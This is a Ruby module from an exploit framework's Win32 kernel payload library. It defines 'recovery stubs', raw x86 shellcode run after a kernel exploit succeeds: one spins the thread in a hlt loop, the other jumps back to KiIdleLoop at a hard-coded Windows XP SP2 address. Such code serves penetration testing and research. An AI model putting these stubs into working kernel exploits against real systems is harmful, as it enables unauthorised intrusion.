# -*- coding: binary -*-
module Rex
module Payloads
module Win32
module Kernel

#
# Recovery stubs are responsible for ensuring that the kernel does not crash.
# They must 'recover' after the exploit has succeeded, either by consuming
# the thread or continuing it on with its normal execution.  Recovery stubs
# will often be exploit dependent.
#
module Recovery

	#
	# The default recovery method is to spin the thread
	#
	def self.default(opts = {})
		spin(opts)
	end

	#
	# Infinite 'hlt' loop.
	#
	def self.spin(opts = {})
		"\xf4\xeb\xfd"
	end

	#
	# Restarts the idle thread by jumping back to the entry point of
	# KiIdleLoop.  This requires a hard-coded address of KiIdleLoop.
	# You can pass the 'KiIdleLoopAddress' in the options hash.
	#
	def self.idlethread_restart(opts = {})
		# Default to fully patched XPSP2
		opts['KiIdleLoopAddress'] = 0x804dbb27 if opts['KiIdleLoopAddress'].nil?

		"\x31\xC0" +                                     # xor eax,eax
		"\x64\xC6\x40\x24\x02" +                         # mov byte [fs:eax+0x24],0x2
		"\x8B\x1D\x1C\xF0\xDF\xFF" +                     # mov ebx,[0xffdff01c]
		"\xB8" + [opts['KiIdleLoopAddress']].pack('V') + # mov eax, 0x804dbb27
		"\x6A\x00" +                                     # push byte +0x0
		"\xFF\xE0"                                       # jmp eax
	end

end

end
end
end
end
